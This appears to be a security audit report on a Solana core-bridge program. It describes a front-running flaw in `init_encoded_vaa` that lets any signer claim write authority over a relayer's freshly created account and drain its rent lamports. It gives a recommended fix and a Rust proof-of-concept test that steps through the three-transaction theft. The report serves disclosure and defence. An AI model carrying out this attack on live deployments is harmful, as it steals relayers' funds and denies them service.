### Title
Unprivileged Front-Running of `init_encoded_vaa` Allows Theft of Relayer Rent Lamports — (`target_chains/solana/programs/core-bridge/src/processor/parse_and_verify_vaa/init_encoded_vaa.rs`)

---

### Summary

`init_encoded_vaa` accepts any signer as `write_authority` for any zeroed, core-bridge-owned account. Because the two-step flow (system `create_account` in TX1, `init_encoded_vaa` in TX2) is not atomic, an attacker can front-run TX2, inject their own pubkey as `write_authority`, and immediately call `close_encoded_vaa` to drain all rent lamports to themselves.

---

### Finding Description

The `InitEncodedVaa` account struct imposes three constraints on the `encoded_vaa` account:

1. Owner must be `crate::ID`
2. Data length must exceed `EncodedVaa::VAA_START`
3. The first `VAA_START` bytes must be all zeros [1](#0-0) 

There is **no constraint** tying `write_authority` to the account's funder or creator. Any signer can present themselves as `write_authority`. The instruction then permanently records that signer's pubkey in the account header: [2](#0-1) 

`close_encoded_vaa` then enforces only that the signer matches the stored `write_authority`: [3](#0-2) 

And `close_account` transfers all lamports to that authority: [4](#0-3) 

The intended two-step flow is confirmed by the CLI and SDK, which always issue `create_account` and `init_encoded_vaa` as separate instructions/transactions: [5](#0-4) [6](#0-5) 

---

### Impact Explanation

The attacker steals the rent-exempt lamports deposited by the relayer when creating the `encoded_vaa` account. For a typical Pyth VAA (~800 bytes + 46-byte header = ~846 bytes), the rent-exempt minimum is approximately **0.008 SOL per account**. A high-frequency relayer posting hundreds of VAAs per minute could lose significant SOL continuously. The relayer's `init_encoded_vaa` call will also fail with `AccountNotZeroed` (since the attacker already wrote the discriminator), causing a denial-of-service on top of the theft.

---

### Likelihood Explanation

Solana validators gossip transactions before they are finalized. An attacker running a validator node or monitoring the gossip network can observe a `create_account` targeting `crate::ID` and immediately submit `init_encoded_vaa(write_authority=attacker, encoded_vaa=victim_account)` with higher priority fees. The attack requires no privileged access, no leaked keys, and no governance majority — only the ability to submit a transaction.

---

### Recommendation

Require that `write_authority` also signs the `create_account` instruction, or — more robustly — require `encoded_vaa` to be a signer in `init_encoded_vaa`. The simplest fix is to add an `encoded_vaa: Signer` constraint so that only the keypair holder who created the account can initialize it:

```rust
#[derive(Accounts)]
pub struct InitEncodedVaa<'info> {
    write_authority: Signer<'info>,

    // Require the encoded_vaa keypair to co-sign, proving the caller
    // controls the account they are initializing.
    #[account(mut, signer, owner = crate::ID)]
    encoded_vaa: UncheckedAccount<'info>,
}
```

Alternatively, bundle `create_account` and `init_encoded_vaa` into a single atomic transaction (as the SDK already does in some paths), and document this as a hard requirement.

---

### Proof of Concept

```rust
// Bankrun / program-test sketch
// 1. Relayer creates the account (TX1)
let encoded_vaa_kp = Keypair::new();
banks_client.process_transaction(Transaction::new_signed_with_payer(
    &[system_instruction::create_account(
        &relayer.pubkey(),
        &encoded_vaa_kp.pubkey(),
        rent_exempt_lamports,
        account_size as u64,
        &CORE_BRIDGE_ID,
    )],
    Some(&relayer.pubkey()),
    &[&relayer, &encoded_vaa_kp],
    recent_blockhash,
)).await.unwrap();

// 2. Attacker front-runs init_encoded_vaa (TX2)
let attacker = Keypair::new();
banks_client.process_transaction(Transaction::new_signed_with_payer(
    &[Instruction {
        program_id: CORE_BRIDGE_ID,
        accounts: InitEncodedVaa {
            write_authority: attacker.pubkey(),   // attacker's key
            encoded_vaa: encoded_vaa_kp.pubkey(), // relayer's account
        }.to_account_metas(None),
        data: instruction::InitEncodedVaa.data(),
    }],
    Some(&attacker.pubkey()),
    &[&attacker],
    recent_blockhash,
)).await.unwrap(); // succeeds — no funder check

// 3. Attacker drains lamports (TX3)
let attacker_lamports_before = banks_client.get_balance(attacker.pubkey()).await.unwrap();
banks_client.process_transaction(Transaction::new_signed_with_payer(
    &[Instruction {
        program_id: CORE_BRIDGE_ID,
        accounts: CloseEncodedVaa {
            write_authority: attacker.pubkey(),
            encoded_vaa: encoded_vaa_kp.pubkey(),
        }.to_account_metas(None),
        data: instruction::CloseEncodedVaa.data(),
    }],
    Some(&attacker.pubkey()),
    &[&attacker],
    recent_blockhash,
)).await.unwrap();

let attacker_lamports_after = banks_client.get_balance(attacker.pubkey()).await.unwrap();
// Assert attacker gained the relayer's deposited rent
assert!(attacker_lamports_after > attacker_lamports_before + rent_exempt_lamports - tx_fee);
// Assert relayer's account is gone
assert!(banks_client.get_account(encoded_vaa_kp.pubkey()).await.unwrap().is_none());
```

pub(crate) fn close_account(info: &AccountInfo, sol_destination: &AccountInfo) -> Result<()> {
    // Transfer tokens from the account to the sol_destination.
    let dest_starting_lamports = sol_destination.lamports();
    **sol_destination.lamports.borrow_mut() =
        dest_starting_lamports.checked_add(info.lamports()).unwrap();
    **info.lamports.borrow_mut() = 0;

    info.assign(&system_program::ID);
    info.resize(0).map_err(Into::into)
}
